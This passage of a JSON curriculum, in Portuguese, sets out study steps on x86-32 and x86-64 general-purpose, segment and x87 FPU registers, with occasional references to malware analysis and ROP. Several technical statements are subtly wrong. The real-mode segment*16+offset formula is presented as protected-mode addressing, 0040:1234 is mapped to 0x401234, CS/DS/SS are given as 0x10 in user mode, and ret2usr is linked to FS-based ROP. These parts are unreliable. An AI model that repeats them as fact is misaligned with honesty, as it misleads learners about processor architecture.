                                    "Identifique funções herdadas: RAX (retorno), RCX/RDX (parâmetros).",
                                    "Analise convenção System V AMD64: primeiros 6 parâmetros em RDI, RSI, RDX, RCX, R8, R9; caller limpa stack.",
                                    "Examine um snippet de assembly x86-64 usando novos registradores."
                                  ],
                                  "verification": "Desenhe um diagrama comparativo dos 16 GPRs com funções principais; teste desassembly de um binário 64-bit.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação AMD64 System V ABI",
                                    "Compilador GCC com flags -S para gerar assembly"
                                  ],
                                  "tips": "Compile código C simples com GCC -m64 -S para ver uso real de GPRs.",
                                  "learningObjective": "Mapear os GPRs expandidos em x86-64 e suas funções na convenção moderna.",
                                  "commonMistakes": [
                                    "Esquecer os 8 novos registradores R8-R15",
                                    "Confundir convenções de parâmetros com x86-32"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Estruturas e Funções dos GPRs entre Ambas Arquiteturas",
                                  "subSteps": [
                                    "Crie uma tabela lado a lado: GPRs x86-32 vs x86-64 (quantidade, tamanho, funções).",
                                    "Destaque diferenças: +8 registradores, endereços 64-bit (RIP, RSP), shadow space em 64-bit.",
                                    "Analise mudanças funcionais: EAX -> RAX, mas funções semelhantes exceto parâmetros.",
                                    "Compare hierarquia: compatibilidade backward (usar EAX em 64-bit modo).",
                                    "Discuta trade-offs: mais registradores reduzem pressão na memória."
                                  ],
                                  "verification": "Preencha uma tabela comparativa completa e explique 3 diferenças chave em voz alta ou por escrito.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha ou ferramenta Markdown para tabelas",
                                    "Exemplos de código assembly de ambos modos"
                                  ],
                                  "tips": "Use cores na tabela para destacar adições (ex: verde para novos em 64-bit).",
                                  "learningObjective": "Realizar comparação precisa das diferenças estruturais e funcionais dos GPRs.",
                                  "commonMistakes": [
                                    "Não notar compatibilidade backward",
                                    "Ignorar impactos no tamanho de ponteiros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impactos em Código Assembly e Convenções de Chamada",
                                  "subSteps": [
                                    "Compare stdcall (x86-32) vs System V (x86-64): stack vs registradores para parâmetros.",
                                    "Escreva/analise funções assembly equivalentes em ambas arquiteturas.",
                                    "Identifique impactos em segurança: ROP chains mais complexas em 64-bit devido a mais registradores.",
                                    "Teste migração: compile código 32-bit para 64-bit e observe mudanças em GPRs.",
                                    "Discuta otimizações: uso de R8-R15 em loops para performance."
                                  ],
                                  "verification": "Desmonte duas funções equivalentes (32 e 64-bit) e liste 5 impactos observados nos GPRs.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "NASM ou GAS assembler",
                                    "Debugger como GDB com suporte a 32/64-bit"
                                  ],
                                  "tips": "Use GDB para step-through e inspecionar registradores durante execução.",
                                  "learningObjective": "Avaliar impactos práticos das diferenças de GPRs em assembly e calling conventions.",
                                  "commonMistakes": [
                                    "Assumir stdcall em 64-bit",
                                    "Não considerar alinhamento de stack em 64-bit (16 bytes)"
                                  ]
                                }
                              ],
                              "practicalExample": "Escreva uma função assembly simples que soma 4 parâmetros: em x86-32 (stdcall, parâmetros no stack usando ESP), compile e desmonte; depois em x86-64 (System V, parâmetros em RDI/RSI/RDX/RCX), compare uso de GPRs no objdump e identifique como R8 seria usado para um 5º parâmetro.",
                              "finalVerifications": [
                                "Liste corretamente os 8 GPRs x86-32 e 16 x86-64 com funções principais.",
                                "Explique 3 diferenças em calling conventions e impacto nos GPRs.",
                                "Identifique uso de novos registradores (R8-R15) em um binário desmontado.",
                                "Descreva como RSP expandido afeta endereçamento de memória.",
                                "Compare pressão em registradores: por que 64-bit é mais eficiente.",
                                "Valide com desassembly de código C compilado para ambos modos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de GPRs e funções (90% correto).",
                                "Profundidade na comparação de estruturas e convenções (cobre tamanhos, quantidade, usos).",
                                "Análise de impactos práticos em assembly (exemplos concretos).",
                                "Uso correto de terminologia (RAX vs EAX, System V vs stdcall).",
                                "Criatividade em conexões com segurança (ex: exploits).",
                                "Completude da tabela/diagrama comparativo."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como otimizador usa GPRs em diferentes arquiteturas.",
                                "Sistemas Operacionais: System calls via registradores em Linux x86-64 (syscall instr).",
                                "Segurança Computacional: Análise de binários para ROP gadgets dependentes de GPRs.",
                                "Arquitetura de Computadores: Evolução de registradores para performance (RISC influência).",
                                "Engenharia de Software: Portabilidade de código assembly 32->64 bits."
                              ],
                              "realWorldApplication": "Em análise de malware ou reverse engineering, comparar GPRs permite detectar binários 32/64-bit, explorar vulnerabilidades como buffer overflows adaptadas a convenções de 64-bit (mais registradores complicam payloads), e otimizar exploits ou defesas em ferramentas como IDA Pro ou Ghidra."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.1.2",
                        "name": "Registradores de Segmento em x86-32 e x86-64",
                        "description": "Identificação dos registradores de segmento (CS, DS, SS, ES, FS, GS) usados para segmentação de memória em x86-32 e seu modelo flat simplificado em x86-64, onde a maioria é ignorada exceto FS/GS para TLS e kernel.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.2.1",
                            "name": "Identificar registradores de segmento em x86-32",
                            "description": "Listar e descrever CS (código), DS (dados), SS (pilha), ES (dados extra), FS e GS (dados gerais), explicando seu papel na formação de endereços lógicos (segmento:offset) no modo protegido.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o conceito e propósito dos registradores de segmento no x86-32",
                                  "subSteps": [
                                    "Leia a documentação oficial da Intel sobre o modo real vs. modo protegido no x86-32.",
                                    "Identifique que registradores de segmento permitem isolamento de código, dados e pilha.",
                                    "Estude como eles são carregados via instruções como MOV, POP e LSS.",
                                    "Visualize um diagrama do modelo de memória segmentada.",
                                    "Anote as diferenças entre registradores de segmento e de uso geral."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras explicando o papel geral dos registradores de segmento e confirme com uma fonte confiável.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Vol. 1)",
                                    "Diagramas de memória segmentada online (ex: OSDev wiki)"
                                  ],
                                  "tips": "Comece com vídeos curtos no YouTube sobre 'x86 segmentation' para visualização rápida.",
                                  "learningObjective": "Compreender o propósito fundamental dos registradores de segmento no isolamento de memória.",
                                  "commonMistakes": [
                                    "Confundir com registradores de 64 bits (sem segmentação)",
                                    "Ignorar o modo protegido vs. real"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e descrever cada registrador de segmento: CS, DS, SS, ES, FS, GS",
                                  "subSteps": [
                                    "Liste CS: Code Segment - aponta para segmento de código executável.",
                                    "Descreva DS: Data Segment - para dados globais e variáveis.",
                                    "Explique SS: Stack Segment - gerencia pilha (PUSH/POP).",
                                    "Detalhe ES: Extra Segment - dados extras, comum em string operations.",
                                    "Estude FS e GS: Segmentos gerais, usados para TLS ou kernel em OS modernos."
                                  ],
                                  "verification": "Crie uma tabela com nome, sigla, propósito e exemplo de uso para cada um dos 6 registradores.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Tabela de registradores x86 (Sandpile.org)",
                                    "Manual de Assembly NASM"
                                  ],
                                  "tips": "Use mnemônicos: CS=Código, DS=Dados, SS=Stack, ES=Extra, FS/GS=Flexíveis.",
                                  "learningObjective": "Memorizar e descrever precisamente o papel de cada registrador de segmento.",
                                  "commonMistakes": [
                                    "Confundir ES com DS (ambos dados, mas ES para extras)",
                                    "Esquecer FS/GS como 'gerais'"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compreender a formação de endereços lógicos (segmento:offset) no modo protegido",
                                  "subSteps": [
                                    "Aprenda a fórmula: Endereço físico = (Segmento * 16) + Offset.",
                                    "Estude como o hardware usa o descritor de segmento da GDT para calcular base real.",
                                    "Simule cálculos manuais com exemplos: CS=0x1000, offset=0x20 -> físico=0x10020.",
                                    "Discuta limitações: offsets de 16 bits, shifts de 4 bits (x16).",
                                    "Compare com modo flat (x86-64)."
                                  ],
                                  "verification": "Resolva 3 exemplos de cálculo de endereço lógico para físico e inverta um.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Calculadora hexadecimal online",
                                    "Emulador Bochs ou QEMU para x86-32"
                                  ],
                                  "tips": "Lembre: *16 é shift left 4 bits em hex para cálculos rápidos.",
                                  "learningObjective": "Calcular e explicar endereços lógicos usando registradores de segmento.",
                                  "commonMistakes": [
                                    "Esquecer o multiplicador 16",
                                    "Confundir offset com endereço físico diretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação em dumps de registradores e cenários reais",
                                  "subSteps": [
                                    "Baixe um dump de registradores de um debugger (ex: OllyDbg sample).",
                                    "Identifique valores de CS, DS, SS, ES, FS, GS no dump.",
                                    "Explique anomalias: ex. CS alterado indica jump de código.",
                                    "Execute um programa simples em DOSBox e monitore registradores.",
                                    "Crie um quiz autoavaliativo com 10 perguntas sobre identificação."
                                  ],
                                  "verification": "Analise um dump real e rotule corretamente todos os registradores de segmento.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "DOSBox ou x32dbg",
                                    "Samples de dumps de malware (VirusTotal ou MalwareBazaar)"
                                  ],
                                  "tips": "Use 'r' em debuggers para ver registradores; foque em hex values.",
                                  "learningObjective": "Aplicar conhecimento para identificar registradores em contextos práticos.",
                                  "commonMistakes": [
                                    "Não notar valores zero/default",
                                    "Ignorar contexto de modo protegido"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um debugger como x32dbg analisando um binário PE32, observe os registradores durante execução: CS=0x0040 (código), DS=0x0040 (dados), SS=0x0040 (pilha). Calcule endereço lógico 0040:1234 como físico aproximado 0x401234, identificando se há overflow de segmento indicando exploração.",
                              "finalVerifications": [
                                "Listar os 6 registradores de segmento com siglas corretas.",
                                "Descrever o papel único de cada um sem erros.",
                                "Calcular corretamente 2 endereços lógico:físico.",
                                "Identificar CS/DS/SS/ES/FS/GS em um dump de registradores.",
                                "Explicar diferenças no modo protegido.",
                                "Reconhecer uso de FS/GS em contextos modernos como TLS."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação: 100% dos 6 registradores corretos.",
                                "Descrições completas: Cada papel explicado em 1-2 frases claras.",
                                "Cálculos de endereços: Sem erros aritméticos em exemplos.",
                                "Aplicação prática: Análise correta de dump com explicação.",
                                "Compreensão conceitual: Diferenças modo protegido vs. flat.",
                                "Criatividade: Exemplos pessoais ou extensões além do básico."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Modelos de memória segmentada vs. paginada.",
                                "Sistemas Operacionais: Gerenciamento de GDT/LDT e carregamento de segmentos.",
                                "Segurança Computacional: Exploração de segmentação em binários maliciosos.",
                                "Programação em Assembly: Uso em instruções como LES, LFS.",
                                "Engenharia de Software: Reverse engineering e análise estática."
                              ],
                              "realWorldApplication": "Na análise de malware e reverse engineering, identificar registradores de segmento em dumps permite detectar injeções de código (mudanças em CS), acessos inválidos a memória (DS/SS overflows) ou uso de FS/GS para threads locais, essencial para ferramentas como IDA Pro ou Ghidra em investigações forenses."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.2.2",
                            "name": "Explicar uso de registradores de segmento em x86-64",
                            "description": "Descrever o modelo de memória flat em 64 bits, onde CS=DS=SS=0x10 (kernel/user), mas FS/GS usados para Thread-Local Storage (TLS) e acesso a estruturas do kernel via MSRs.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Modelo de Memória Flat em x86-64",
                                  "subSteps": [
                                    "Ler documentação oficial da Intel sobre o modo Long Mode (x86-64).",
                                    "Identificar que em x86-64, a segmentação é simplificada para um modelo flat de 64 bits.",
                                    "Comparar com x86-32, onde segmentação era obrigatória.",
                                    "Visualizar diagrama da memória virtual flat (0 a 2^48 -1 bytes endereçáveis).",
                                    "Explicar que bases de segmentos são ignoradas exceto para FS/GS."
                                  ],
                                  "verification": "Desenhar um diagrama simples do modelo flat e listar diferenças com x86-32.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Manual Intel x86-64 (Volume 1), diagramas online de memória x86-64.",
                                  "tips": "Foque na transição do protected mode para long mode durante boot.",
                                  "learningObjective": "Compreender por que x86-64 usa memória flat em vez de segmentação complexa.",
                                  "commonMistakes": "Confundir com modelo segmentado de 16/32 bits; assumir que todos registradores de segmento são irrelevantes."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Registradores CS, DS e SS em x86-64",
                                  "subSteps": [
                                    "Ler valores padrão: CS=0x10 (kernel), DS=SS=0x10 (user/kernel dependendo do modo).",
                                    "Explicar que selectors apontam para descritores nulos ou flat (base=0, limit=2^64).",
                                    "Verificar em código assembly como ler esses registradores com MOV.",
                                    "Discutir ring levels: Ring 0 (kernel) vs Ring 3 (user).",
                                    "Executar instrução para dump de registradores em um debugger."
                                  ],
                                  "verification": "Executar código assembly que imprime valores de CS/DS/SS e confirmar 0x10 ou equivalente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "GDB ou x64dbg, compilador NASM/GCC com -m64.",
                                  "tips": "Use 'mov rax, cs' em assembly para ler sem privilégios elevados.",
                                  "learningObjective": "Identificar valores fixos e papéis canônicos de CS/DS/SS no modelo flat.",
                                  "commonMistakes": "Ignorar diferenças user/kernel; pensar que DS/SS variam livremente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Uso de FS e GS para Thread-Local Storage (TLS)",
                                  "subSteps": [
                                    "Estudar como FS/GS têm bases configuráveis via WRFSBASE/WRGSBASE ou MSRs.",
                                    "Implementar TLS em C com __thread e inspecionar FS base em assembly.",
                                    "Explicar que FS aponta para estrutura pthread ou equivalente em user space.",
                                    "Verificar com 'rdfsbase' em código assembly moderno.",
                                    "Comparar FS (user TLS) vs GS (kernel TLS em alguns SOs)."
                                  ],
                                  "verification": "Compilar programa TLS, attach GDB e checar FS base aponta para TLS area.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Código exemplo TLS (GCC/Clang), GDB, man pages de pthread.",
                                  "tips": "Use 'info registers fs' no GDB para dump rápido.",
                                  "learningObjective": "Dominar como FS/GS habilitam armazenamento local por thread sem locks globais.",
                                  "commonMistakes": "Confundir FS/GS com CS/DS; não recompilar com -m64."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compreender Acesso a Estruturas do Kernel via MSRs e FS/GS",
                                  "subSteps": [
                                    "Explicar MSRs como IA32_FS_BASE (C000_0100h) para setar FS base no kernel.",
                                    "Discutir uso em kernel: GS para per-CPU variables, FS para current task struct.",
                                    "Ler código Linux kernel (task_struct via GS:offset).",
                                    "Simular em VM com kernel modules que leem MSRs.",
                                    "Analisar em exploit PoCs como ret2usr usa FS para ROP chains."
                                  ],
                                  "verification": "Escrever snippet kernel module que seta MSR e acessa via GS, compilar e testar em QEMU.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Linux kernel source, QEMU/KVM, rdmsr/wrmsr tools, kernel module template.",
                                  "tips": "Comece com user-mode simulação antes de kernel; use privilégios CAP_SYS_ADMIN.",
                                  "learningObjective": "Aplicar FS/GS para acesso eficiente a dados kernel/user thread-specific.",
                                  "commonMistakes": "Tentar acessar MSRs sem ring 0; ignorar verificações SMEP/SMAP."
                                }
                              ],
                              "practicalExample": "Em um programa multi-threaded em C, declare __thread int myvar = 42; Compile com gcc -m64. No GDB, pause um thread e execute 'info reg fs'; observe que FS base aponta para TLS block contendo myvar. Modifique via 'set {int}($fs_base + offset) = 100' e verifique mudança thread-local.",
                              "finalVerifications": [
                                "Explicar verbalmente diferenças entre CS/DS/SS e FS/GS em x86-64.",
                                "Dump registradores em um binário rodando e identificar valores flat.",
                                "Implementar e debugar TLS access via FS em assembly.",
                                "Descrever como kernel usa GS para current_task em 3 frases.",
                                "Identificar MSR para FS_BASE (0xC0000100) e seu propósito.",
                                "Simular acesso kernel struct via GS em pseudocódigo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do modelo flat (sem menção errada a limites/bases CS/DS).",
                                "Correta identificação de usos FS/GS vs outros segmentos.",
                                "Código prático executável demonstrando TLS via FS.",
                                "Compreensão de MSRs e privilégios ring 0.",
                                "Análise clara de aplicações em segurança (ex: bypass ASLR parcial).",
                                "Uso correto de terminologia (Long Mode, selectors nulos)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de threads e per-CPU data.",
                                "Segurança Computacional: Exploração de leaks via FS em ROP/JOP.",
                                "Arquitetura de Computadores: Evolução de segmentação para paging.",
                                "Programação de Sistemas: Inline assembly para MSRs em drivers."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, analisar binários que manipulam FS para TLS evasion; em desenvolvimento kernel Linux, otimizar acesso a task_struct via GS para performance; em debugging multi-thread, usar FS para inspecionar variáveis locais sem parar todos threads."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.2.3",
                            "name": "Comparar segmentação entre x86-32 e x86-64",
                            "description": "Analisar transição de segmentação complexa em 32 bits para flat em 64 bits, identificando cenários onde FS/GS ainda são relevantes em análise de binários malware.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Segmentação em x86-32",
                                  "subSteps": [
                                    "Estudar os seis registradores de segmento: CS, DS, ES, FS, GS, SS e seus papéis (código, dados, pilha, etc.)",
                                    "Compreender descritores de segmento na GDT/LDT, incluindo base, limite e flags de privilégio",
                                    "Aprender cálculo de endereços lógicos: endereço físico = base do segmento + offset",
                                    "Explorar verificações de proteção: limites, privilégios e canonicalidade",
                                    "Analisar exemplos de switches de segmento em código assembly 32 bits"
                                  ],
                                  "verification": "Criar um diagrama manual mostrando cálculo de endereço segmentado e validação de limites.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Manual Intel x86 Volume 3",
                                    "Emulador como DOSBox ou Bochs",
                                    "Editor de texto para assembly"
                                  ],
                                  "tips": "Use diagramas para visualizar base + offset; memorize flags DPL para privilégios.",
                                  "learningObjective": "Descrever completamente o modelo de segmentação protegida em x86-32 e seus mecanismos de proteção.",
                                  "commonMistakes": [
                                    "Confundir offset com endereço linear",
                                    "Ignorar validação de limites que causa #GP faults",
                                    "Subestimar o overhead de switches de segmento frequentes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Segmentação em x86-64",
                                  "subSteps": [
                                    "Entender o modelo flat: CS=DS=ES=SS=0, sem base/limite ativos para a maioria",
                                    "Estudar configuração de FS/GS via MSRs (RDMSR/WRMSR) com instruções SWAPGS",
                                    "Explorar usos: FS para TLS (Thread Local Storage) em user-mode, GS para per-CPU em kernel",
                                    "Verificar como endereços virtuais são diretos em 64 bits (sem segmentação)",
                                    "Examinar legacy mode vs long mode e impacto na segmentação"
                                  ],
                                  "verification": "Listar em uma tabela as diferenças nos registradores de segmento entre modos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Manual AMD64 Architecture Programmer's Manual",
                                    "Debugger como x64dbg ou WinDbg",
                                    "Documentação Microsoft PEB/TEB"
                                  ],
                                  "tips": "Lembre-se: flat model simplifica paging; foque em FS/GS como 'segmentos especiais'.",
                                  "learningObjective": "Explicar o modelo flat de 64 bits e os usos remanescentes de FS/GS.",
                                  "commonMistakes": [
                                    "Assumir que todos os registradores de segmento são ignorados em 64 bits",
                                    "Confundir FS user-mode (TLS) com GS kernel-mode",
                                    "Esquecer SWAPGS em syscalls"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Diretamente x86-32 e x86-64",
                                  "subSteps": [
                                    "Criar tabela comparativa: complexidade (32: multi-segmento vs 64: flat)",
                                    "Comparar cálculo de endereços e overhead de performance",
                                    "Destacar exceções: FS/GS em 64 bits para acesso rápido a estruturas como TEB/PEB",
                                    "Analisar migração: compatibilidade mode e impacto em binários legacy",
                                    "Discutir simplificações: remoção de LDT, limites implícitos em 64 bits"
                                  ],
                                  "verification": "Preencher uma tabela de comparação com pelo menos 10 diferenças chave.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta de tabela como Excel ou Markdown",
                                    "Exemplos de código assembly 32/64 bits"
                                  ],
                                  "tips": "Use 'antes/depois' para visualizar transição; teste em debugger para confirmação.",
                                  "learningObjective": "Identificar e justificar todas as diferenças principais na segmentação entre as arquiteturas.",
                                  "commonMistakes": [
                                    "Superestimar uso de segmentação em 64 bits modernos",
                                    "Ignorar performance gains do flat model",
                                    "Confundir segmentação com paging"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar em Análise de Binários Malware",
                                  "subSteps": [
                                    "Carregar binário 32 bits em debugger e observar acessos segmentados (ex: FS:[0])",
                                    "Analisar malware 64 bits: identificar MOV [FS:offset] para PEB ou TEB hiding",
                                    "Comparar cenários: segmentação complexa em 32 para ofuscação vs FS/GS em 64",
                                    "Simular cenários onde FS/GS revelam strings ou chaves malware",
                                    "Documentar hooks ou injeções que abusam desses registradores"
                                  ],
                                  "verification": "Analisar um binário real e anotar 3 usos de FS/GS com screenshots do debugger.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "x64dbg ou IDA Pro Free",
                                    "Amostra malware segura (ex: de MalwareBazaar)",
                                    "Guia de análise de PEB/TEB"
                                  ],
                                  "tips": "Procure por FS:0x30 (ProcessEnvironmentBlock) em malwares Windows 64 bits.",
                                  "learningObjective": "Reconhecer padrões de segmentação/FS-GS em binários malware para análise reversa.",
                                  "commonMistakes": [
                                    "Não alternar para modo correto no debugger (32 vs 64)",
                                    "Ignorar contexto thread em TLS via FS",
                                    "Falhar em detectar anti-debug via verificação de GS"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um malware Windows 64 bits, instruções como 'mov rax, gs:[0x60]; mov rax, [rax + 0x18]' acessam o PEB via GS para enumerar módulos carregados, permitindo injeção dinâmica. Compare com 32 bits onde DS/FS switches seriam necessários, revelando ofuscação via segmentação.",
                              "finalVerifications": [
                                "Explicar por que x86-64 usa modelo flat e liste exceções FS/GS.",
                                "Calcular manualmente um endereço segmentado em 32 bits vs virtual direto em 64.",
                                "Identificar 3 usos reais de FS/GS em binários modernos.",
                                "Descrever impacto na análise de malware.",
                                "Comparar overhead de performance entre modelos.",
                                "Simular SWAPGS em um debugger."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de registradores e cálculos (90%+ correto).",
                                "Profundidade na comparação (cobrir pelo menos 8 diferenças chave).",
                                "Aplicação prática: análise correta de binário com FS/GS.",
                                "Identificação de erros comuns e proteções.",
                                "Clareza em diagramas/tabelas explicativos.",
                                "Conexão com cenários reais de segurança."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento de memória virtual e TLS.",
                                "Engenharia Reversa: Disassembly e debugging de binários.",
                                "Arquitetura de Computadores: Evolução x86 e modos de CPU.",
                                "Segurança da Informação: Técnicas de ofuscação em malware.",
                                "Programação em Assembly: Otimização de acessos rápidos."
                              ],
                              "realWorldApplication": "Na análise forense de malware, detectar acessos FS/GS em binários 64 bits revela estruturas ocultas como PEB/TEB para persistência ou C2, permitindo desofuscação rápida; essencial em incident response para threat hunting em ambientes Windows."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.1.3",
                        "name": "Registradores de Ponto Flutuante em x86-32 e x86-64",
                        "description": "Visão geral dos registradores da FPU (ST0-ST7 de 80 bits), SSE (XMM0-XMM15 de 128 bits) e AVX (YMM/ZMM em 64 bits), suas funções em operações vetoriais e escalares.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.3.1",
                            "name": "Descrever registradores FPU (x87)",
                            "description": "Identificar os 8 registradores stack-based ST0-ST7 da FPU x87, explicando seu uso em operações de ponto flutuante de 32/64/80 bits e instruções como FLD, FSTP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender a Arquitetura Stack-Based da FPU x87",
                                  "subSteps": [
                                    "Pesquise a história e o propósito da FPU x87 como coprocessador matemático em x86.",
                                    "Estude o conceito de pilha (stack) na FPU, onde registradores funcionam como uma pilha LIFO.",
                                    "Identifique o TOP pointer que indica o topo da stack.",
                                    "Revise o registrador de status (FPU Status Word) e controle.",
                                    "Compare com registradores SSE para contextualizar limitações da x87."
                                  ],
                                  "verification": "Explique em suas palavras como a stack opera e desenhe um diagrama simples da pilha com ST0 no topo.",
                                  "estimatedTime": "20-30 minutes",
                                  "materials": [
                                    "Documentação Intel x87 manuals (Vol. 1, Capítulo 8)",
                                    "Ferramenta de diagrama como draw.io",
                                    "Vídeo tutorial sobre FPU stack no YouTube"
                                  ],
                                  "tips": "Visualize a stack como uma pilha de pratos: ST0 é o de cima, FLD adiciona, FSTP remove.",
                                  "learningObjective": "Compreender o modelo stack-based da FPU x87 e seus componentes principais.",
                                  "commonMistakes": [
                                    "Confundir com registradores GPR lineares",
                                    "Ignorar o papel do TOP pointer",
                                    "Assumir que ST0 é sempre fixo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Descrever os Registradores ST0-ST7",
                                  "subSteps": [
                                    "Liste os 8 registradores: ST0 (topo), ST1, ..., ST7 (base).",
                                    "Descreva cada um como 80-bit extended precision registers.",
                                    "Explique que são acessados relativamente ao TOP (ex: ST(0) é ST0 quando TOP=0).",
                                    "Estude tamanhos suportados: 32-bit (single), 64-bit (double), 80-bit (extended).",
                                    "Anote convenções de nomenclatura em assembly (ST vs ST(i))."
                                  ],
                                  "verification": "Crie uma tabela com ST0-ST7, tamanhos suportados e notação ST(i).",
                                  "estimatedTime": "25-35 minutes",
                                  "materials": [
                                    "Intel 64 and IA-32 Architectures Software Developer’s Manual (PDF)",
                                    "Editor de texto ou spreadsheet para tabela"
                                  ],
                                  "tips": "Memorize: ST0 é sempre o operando implícito na maioria das instruções.",
                                  "learningObjective": "Descrever precisamente os 8 registradores ST0-ST7 e suas características.",
                                  "commonMistakes": [
                                    "Pensar que são registradores independentes como em SSE",
                                    "Confundir 80-bit com 64-bit",
                                    "Esquecer notação relativa ao TOP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Instruções Básicas de Load e Store",
                                  "subSteps": [
                                    "Estude FLD: carrega valor na stack (empurra para ST0, ajusta TOP).",
                                    "Analise FSTP/FST: armazena de ST0 e popa a stack.",
                                    "Pratique com variantes: FLD single/double/extended, FSTP para memória.",
                                    "Entenda FADD, FMUL como operações stack-based (ST0 op ST1).",
                                    "Simule uma sequência: FLD val1; FLD val2; FADD; FSTP result."
                                  ],
                                  "verification": "Escreva e simule em papel uma sequência de instruções para somar dois floats.",
                                  "estimatedTime": "30-40 minutes",
                                  "materials": [
                                    "Emulador online como JSFiddle com x86 emu",
                                    "NASM ou GAS syntax reference",
                                    "Exemplos de código assembly x87"
                                  ],
                                  "tips": "Lembre: Toda instrução x87 é stack-oriented; ST0 é o destino/acumulador padrão.",
                                  "learningObjective": "Dominar instruções chave como FLD e FSTP em operações de ponto flutuante.",
                                  "commonMistakes": [
                                    "Usar sintaxe errada (FLD dest, src em vez de src para stack)",
                                    "Esquecer pop com FSTP",
                                    "Ignorar overflow/underflow flags"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Análise e Verificação de Código FPU",
                                  "subSteps": [
                                    "Disasseble um binário simples com FPU usando objdump ou Ghidra.",
                                    "Identifique registradores STx em instruções FLD/FSTP.",
                                    "Simule execução passo-a-passo rastreando TOP e valores.",
                                    "Verifique mudanças no Status Word (ex: C0-C3 flags).",
                                    "Escreva um snippet assembly que use ST0-ST3 para uma operação complexa."
                                  ],
                                  "verification": "Analise um código fornecido e liste todos os registradores FPU usados e seu fluxo.",
                                  "estimatedTime": "35-45 minutes",
                                  "materials": [
                                    "Objdump ou IDA Free",
                                    "Compilador GCC com -mfpmath=387",
                                    "Sample binary com FPU code"
                                  ],
                                  "tips": "Use 'r' em GDB para ver registradores FPU (st0-st7).",
                                  "learningObjective": "Aplicar conhecimento para analisar e depurar código usando FPU x87.",
                                  "commonMistakes": [
                                    "Não rastrear TOP corretamente",
                                    "Confundir ST(i) com registradores fixos",
                                    "Ignorar precisão extended em cálculos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário de malware, identifique uma sequência FLD [mem]; FSTP ST1; FADD ST0, ST1 para ofuscar cálculos criptográficos, rastreando ST0-ST7 para entender o fluxo de dados flutuantes.",
                              "finalVerifications": [
                                "Liste corretamente ST0-ST7 e explique acesso relativo ao TOP.",
                                "Descreva diferenças entre 32/64/80-bit formats na FPU.",
                                "Simule uma stack operation com FLD e FSTP sem erros.",
                                "Identifique FPU registers em um disassembly fornecido.",
                                "Explique impacto de TOP no comportamento das instruções.",
                                "Diferencie x87 de SSE em uso de floating-point."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição dos 8 registradores (100% corretos).",
                                "Correta simulação de stack operations (TOP e valores).",
                                "Uso correto de terminologia (FLD, FSTP, ST(i)).",
                                "Profundidade em tamanhos de dados e flags de status.",
                                "Capacidade de análise prática em código real.",
                                "Clareza em explicações e diagramas."
                              ],
                              "crossCurricularConnections": [
                                "Assembly x86 geral: Integração com GPR e flags.",
